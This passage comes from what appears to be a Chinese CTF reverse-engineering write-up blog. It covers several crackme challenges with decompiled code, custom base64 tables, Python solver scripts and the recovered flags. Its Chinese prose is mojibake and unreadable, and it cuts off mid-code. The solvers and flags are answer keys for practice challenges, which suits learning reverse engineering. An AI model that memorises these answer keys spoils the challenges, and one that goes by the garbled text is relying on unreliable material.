class="code"><pre><span class="line">exe = [<span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0x7</span>, <span class="number">0x9</span>, <span class="number">0x7</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x1207</span>, <span class="number">0x4CA0</span>, <span class="number">0x4F21</span>, <span class="number">0x0039</span>, <span class="number">0x1A523</span>, <span class="number">0x023A</span>, <span class="number">0x0926</span>, <span class="number">0x4CA7</span>, <span class="number">0x6560</span>, <span class="number">0x0036</span>, <span class="number">0x1A99B</span>, <span class="number">0x4CA8</span>, <span class="number">0x1BBE0</span>, <span class="number">0x3705</span>, <span class="number">0x0926</span>, <span class="number">0x77D3</span>, <span class="number">0x9A98</span>, <span class="number">0x657B</span>, <span class="number">0x0018</span>, <span class="number">0x0B11</span>]</span><br><span class="line"></span><br><span class="line">z3num = <span class="built_in">list</span>(<span class="string">&#x27;hahahathisisfackflag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stron = [<span class="number">0</span>]*<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range (<span class="number">20</span>):</span><br><span class="line">    stron[i] = ord(z3num[<span class="number">19</span> - i]) ^ last[i]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">20</span></span><br><span class="line">def po(flag,b):</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (b):</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span> != <span class="number">0</span>):</span><br><span class="line">            a *= flag</span><br><span class="line">        flag = flag * flag % <span class="number">1000</span></span><br><span class="line">        b &gt;&gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>): </span><br><span class="line">    <span class="keyword">for</span> chrr in range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (po(chrr,exe[i]) == stron[i]):</span><br><span class="line">            flag[i] = chr(chrr)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;.join(flag))</span></span><br><span class="line"><span class="string">#T1e_z3_1s_v1r9_3asy!</span></span><br></pre></td></tr></table></figure><p>çˆ†ç ´å¾—å‡ºç­”æ¡ˆ</p><p>æ€»ç»“ï¼š</p><p>z3é‡åˆ°æˆ–æ—¶è®¡ç®—éå¸¸æ…¢ï¼Œç”¨bitvecå‹æˆ–æŠŠæˆ–é€»è¾‘æ”¹æˆä¸åŠ å¿«é€Ÿåº¦</p><p>æœ€åä¸€æ­¥é‡åˆ°ä¸å¥½é€†å‘çš„ä¹Ÿä¸å¥½z3çš„ï¼Œå¯ä»¥ç”¨çˆ†ç ´æ±‚è§£å› ä¸ºå­—ç¬¦ä¸€å®šåœ¨32åˆ°127</p><p>ä¸€ä¸ªç–‘é—®æ˜¯ï¼šæœ€åä¸€æ­¥çš„béƒ½æ˜¯ä¸€ä½æ•°ï¼Œè¯´æ˜aä¸€å®šæ˜¯1æˆ–è€…flagçš„å€¼ï¼Œstroné‡Œé¢å°±åº”è¯¥æ˜¯è¿™ä¸ªæ•°ä¸ºä»€ä¹ˆstroné‡Œä¸æ˜¯å‘¢</p><h2 id="NSSCTF-2nd-MyBase">[NSSCTF 2nd]MyBase</h2><p>æ‰“å¼€idaåå‘ç°æœ‰tlsï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹</p><p>idaæ‰“å¼€ä¹‹å</p><p>mainå‡½æ•°æœ‰ä¸¤ä¸ªå­å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _main();</span><br><span class="line">  test();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè°ƒè¯•çœ‹çœ‹æœ‰æ²¡æœ‰åè°ƒè¯•ï¼Œç„¶åå‘ç°å¹¶æ²¡æœ‰</p><p>ç¬¬ä¸€ä¸ª_mainçœ‹ä¸æ‡‚ï¼Œç›´æ¥è¿›testï¼Œé‡Œé¢æœ‰ä¸€ä¸ªbase64</p><p>æ‰“å¼€åæ ¹æ®ç è¡¨ç›´æ¥è§£å¯†ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥ã€‚ã€‚</p><p>å»dataé‡Œé¢çœ‹çœ‹ï¼Œå‘ç°è¿˜æœ‰ç è¡¨ï¼Œè¿›äº¤å‰å¼•ç”¨çš„å‡½æ•°å‘ç°æœ‰ä¸€ä¸ªæ‰“ä¹±çš„ä»£ç </p><p>æ˜¯ä¸ªcè¯­è¨€å‡½æ•°ï¼Œæœ‰srandå‡½æ•°ï¼Œæ‰€ä»¥è°ƒè¯•æŠŠä»–æ‰¾å‡ºæ¥</p><p>çœŸï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK</span>+SChbFanmklWEcgixXJIq6y5B/<span class="number">9</span>z</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹åŠ å¯†çš„ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/</span></span><br></pre></td></tr></table></figure><hr><p>ç„¶åå‘ç°è¿™ä¸ªæ‰“ä¹±ä»£ç æ‰§è¡Œäº†å¾ˆå¤šæ¬¡</p><p>æ„Ÿè§‰å“ªé‡Œæ¼äº†ï¼Œæœ€åæŸ¥æ‰¾äº¤å‰å¼•ç”¨å‘ç°æ‰“ä¹±ä»£ç åœ¨åŠ å¯†é‡Œé¢æœ‰ä¸€è¡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !setjmp(env) )</span><br><span class="line">    exception_handler();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡æŸ¥é˜…ï¼š</p><p>setjmpå’Œlongjmpæˆå¯¹ä½¿ç”¨å®ç°å‡½æ•°é—´è·³è½¬</p><p>setjmpå°†å‡½æ•°åœ¨æ­¤å¤„çš„ä¸Šä¸‹æ–‡ä¿å­˜åœ¨jmp_bufç»“æ„ä½“ä¸­ï¼Œä»¥ä¾›longjmpä»æ­¤ç»“æ„ä½“ä¸­æ¢å¤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setjmp</span><span class="params">(jmp_buf env)</span>;</span><br></pre></td></tr></table></figure><p>envä¸ºä¿å­˜çš„ç»“æ„ä½“å˜é‡çš„ä½ç½®ï¼Œè‹¥ç›´æ¥è°ƒç”¨è¿”å›0ï¼Œå¦åˆ™è¿”å›é0ï¼ˆä¸»è¦æŒ‡é€šè¿‡longjmpè·³è½¬ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">longjmp</span><span class="params">(jmp_buf env, <span class="type">int</span> val)</span>;</span><br></pre></td></tr></table></figure><p>envä¸ºç”±setjmpä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œvalè¡¨ç¤ºlongjmpä¼ ç»™setjmpçš„è¿”å›å€¼ï¼Œå¦‚æœval=0ï¼Œåˆ™setjmpè¿”å›1ï¼Œå¦åˆ™è¿”å›val</p><p>longjmp ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯ä» setjmp å‡½æ•°ä¸­è¿”å›ï¼Œlongjmp æ‰§è¡Œå®Œä¹‹åï¼Œç¨‹åºå°±åƒåˆšä» setjmp å‡½æ•°è¿”å›ä¸€æ ·ã€‚</p><p>æ‰€ä»¥ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !setjmp(env) )</span><br><span class="line">      exception_handler();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å…ˆæ‰§è¡Œsetjmp(env)ï¼Œè¿”å›0</p><p>è¿›å…¥exception_handler();</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">exception_handler</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  generate_base64_table(base64_table);</span><br><span class="line">  longjmp_0(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ›´æ–°base64ç è¡¨</p><p>æ‰€ä»¥é€»è¾‘æ˜¯ï¼š</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å¯¹ç¬¬ä¸€ç»„åŠ å¯†</span><br><span class="line">æ›´æ–°</span><br><span class="line">å¯¹ç¬¬äºŒç»„åŠ å¯†</span><br><span class="line">æ›´æ–°</span><br><span class="line">å¯¹ç¬¬ä¸‰ç»„åŠ å¯†</span><br><span class="line">æ›´æ–°</span><br><span class="line"><span class="meta prompt_">...</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯†æ–‡</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">YkLY</span></span><br><span class="line"><span class="symbol">v1Xj</span></span><br><span class="line"><span class="number">23</span><span class="built_in">X7</span></span><br><span class="line"><span class="symbol">N0E5</span></span><br><span class="line"><span class="symbol">eoFg</span></span><br><span class="line"><span class="symbol">UveK</span></span><br><span class="line"><span class="symbol">eos1</span></span><br><span class="line"><span class="symbol">XS8K</span></span><br><span class="line"><span class="number">9</span>r4g</span><br></pre></td></tr></table></figure><p>ç è¡¨</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/</span><br><span class="line">YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK+SChbFanmklWEcgixXJIq6y5B/9z</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br><span class="line">YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u</span><br><span class="line">xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹äº†åŠå¤©</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v10 = (bbb &lt;&lt; <span class="number">8</span>) + (aa &lt;&lt; <span class="number">16</span>) + cc;</span><br><span class="line">    basenum[v14] = base64_table[cc &amp; <span class="number">0x3F</span>];</span><br><span class="line">    basenum[v14 + <span class="number">1</span>] = base64_table[(v10 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    basenum[v14 + <span class="number">2</span>] = base64_table[(v10 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x3F</span>];</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯å€’åºè¾“å‡º</p><p>é‚£ä¹ˆå°±ç›´æ¥å€’åºè§£ç ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">YLkY</span><br><span class="line">jX1v</span><br><span class="line"><span class="number">7</span>X32</span><br><span class="line"><span class="number">5E0</span>N</span><br><span class="line">gFoe</span><br><span class="line">KevU   T0_</span><br><span class="line"><span class="number">1</span>soe   Re_</span><br><span class="line">K8SX</span><br><span class="line">g4r9   <span class="keyword">ld</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">NSSCTF</span><span class="template-variable">&#123;Welc0me_T0_Re_World&#125;</span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-jump-by-jump-revenge">[NSSRound#3 Team]jump_by_jump_revenge</h2><p>æ‰“å¼€åå‘ç°mainå‡½æ•°ä¸èƒ½åç¼–è¯‘ï¼Œæ„Ÿè§‰æœ‰èŠ±æŒ‡ä»¤</p><p>ç„¶ånopæ‰ä¸¤è¡Œä»£ç </p><p>è·å¾—æ­£ç¡®çš„main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">36</span>]; <span class="comment">// [esp+E8h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_411037(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">29</span>; ++i )</span><br><span class="line">    Str1[i] = (Str1[i] + Str1[(i * i + <span class="number">123</span>) % <span class="number">21</span>]) % <span class="number">96</span> + <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !j_strcmp(Str1, <span class="string">&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nope!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç®—æ³•è¦æ³¨æ„è¦ä»åé¢å¾€å‰ï¼Œå› ä¸ºå‰é¢çš„å·²ç»è¢«è¦†ç›–äº†</p><p>éå¸¸æŠ½è±¡ï¼ˆTATï¼‰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">last = <span class="string">&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;</span></span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">29</span></span><br><span class="line">c = [<span class="number">0</span>]*<span class="number">29</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    c[i] = (i * i + <span class="number">123</span>) % <span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#flag[i] = (flag[i] + flag[c[i]]) % 96 + 32</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt; c[i]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            uuk = (<span class="built_in">ord</span>(last[i])-<span class="number">32</span>)+ j * <span class="number">96</span> -<span class="built_in">ord</span>(last[c[i]])</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">31</span>&lt; uuk &lt; <span class="number">127</span>):</span><br><span class="line">                flag[i]=uuk</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            uuk = (<span class="built_in">ord</span>(last[i])-<span class="number">32</span>)+ j * <span class="number">96</span> -flag[c[i]]</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">31</span>&lt; uuk &lt; <span class="number">127</span>):</span><br><span class="line">                flag[i]=uuk</span><br><span class="line">u = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    u += <span class="built_in">chr</span>(flag[i])</span><br><span class="line"><span class="built_in">print</span>(u) </span><br><span class="line"><span class="comment">#NSSCTF&#123;Jump_b9_jump!_r3V3n9e&#125;</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šé€†å‘åŠ å¯†ç®—æ³•æ—¶è¦æ³¨æ„æ˜¯é€’æ¨å¼çš„è¿˜æ˜¯æ˜ å°„å¼çš„</p><p>çœ‹äº†çœ‹å¤§ä½¬çš„wpï¼Œå¥½ç®€æ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ciper=<span class="string">&#x27;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(len(ciper)<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    tmp=ord(ciper[i])<span class="number">-32</span>-ord(ciper[(i*i+<span class="number">123</span>)%<span class="number">21</span>])</span><br><span class="line">    <span class="keyword">while</span>(tmp&lt;<span class="number">33</span>):</span><br><span class="line">        tmp+=<span class="number">96</span></span><br><span class="line">    ciper=ciper[:i]+chr(tmp)+ciper[i+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">print(ciper)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-2-Able-findxenny">[NSSRound#2 Able]findxenny</h2><p>æ‰“å¼€mainå‡½æ•°çœ‹çœ‹ï¼Œå¯¹è¾“å…¥çš„flagçš„æ£€æŸ¥çš„å‡½æ•°è¿”å›å€¼æ˜¯æœ¬èº«ï¼Ÿï¼Ÿæ²¡ç†è§£æš‚æ—¶è·³è¿‡ï¼Œçœ‹åˆ°æœ€åçš„æ£€æŸ¥æœ‰ä¸‰ä¸ªcheck</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check1</span>(*v14) || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check2</span>(*v15) || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check3</span>(*v16) )</span><br><span class="line">   &#123;</span><br><span class="line">     v10 = <span class="built_in">sub_7FF72A641262</span>(std::cout, <span class="string">&quot;Try harder&quot;</span>);</span><br><span class="line">     std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, sub_7FF72A6411FE);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     v9 = <span class="built_in">sub_7FF72A641262</span>(std::cout, <span class="string">&quot;I can&#x27;t believe my golden doge eye! we are comarde!&quot;</span>);</span><br><span class="line">     std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, sub_7FF72A6411FE);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€ç»„æ•°ï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æŸ¥çœ‹è¿™ä¸ªæ•°æ®æ˜¯é€šè¿‡å‡½æ•°ç”Ÿæˆçš„ï¼Œä½†æ˜¯æ²¡çœ‹æ‡‚ã€‚ã€‚ã€‚</p><p>çœ‹äº†wpå‘ç°è¿™ä¸ªæ˜¯SMCï¼Œä¸‰ä¸ªcheckæ˜¯å‡½æ•°ï¼ŒåŒå‡»è¿›å…¥å¯¹åº”åœ°å€ï¼Œå‘ç°éƒ½æ˜¯æ•°æ®ï¼Œè¿™æ—¶è¦cåŠ pç»„åˆå†f5è¿›å…¥åç¼–è¯‘ç»“æœæ£€æŸ¥çš„å€¼å°±åœ¨è¿™é‡Œ</p><p><img src="https://s2.loli.net/2023/12/27/o82P7AFzawI6l49.png" alt="image-20231227230725460"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBE97370</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x665F756F795F686F</span>i64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBEA01C0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = a1;</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;ound_our&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v3 + v1) == *((_BYTE *)v4 + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v1 &gt;= <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBE999B4</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x796E6E33785F</span>i64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¾—å‡ºç»“æœ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh_you_fou<span class="symbol">nd_our_x3</span><span class="symbol">nny</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼Œå¦‚æœçœ‹åˆ°virtulprotectå’Œæ•°æ®å½“ä½œåœ°å€ï¼Œå°è¯•æŠŠæ•°æ®æ”¹æˆä»£ç </p><h2 id="NSSCTF-2nd-Bytecode">[NSSCTF 2nd]Bytecode</h2><p>æ‰“å¼€åï¼Œæ˜¯pyå­—èŠ‚ç </p><p>åç¼–è¯‘ä¸€ä¸‹</p><h1>å®‰æ´µæ¯</h1><h2 id="mobilego">mobilego</h2><p>jadxæ‰“å¼€mainactivity</p><p>æ¨¡æ‹Ÿå™¨ä¸­å°è¯•è¾“å…¥ï¼Œè¿”å›nonono</p><p>å‘ç°åˆ¤æ–­å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> m141lambda$onCreate$<span class="number">0</span>$comexamplemobilegoMainActivity(View v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Game.checkflag(<span class="built_in">this</span>.editText.getText().toString()).equals(getResources().getString(C0569R.string.cmp))) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;yes your flag is right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;No No No&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨C0569Rä¸­æœ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">string</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">app_name</span> <span class="operator">=</span> <span class="number">2131689500</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> <span class="number">2131689512</span>;</span><br><span 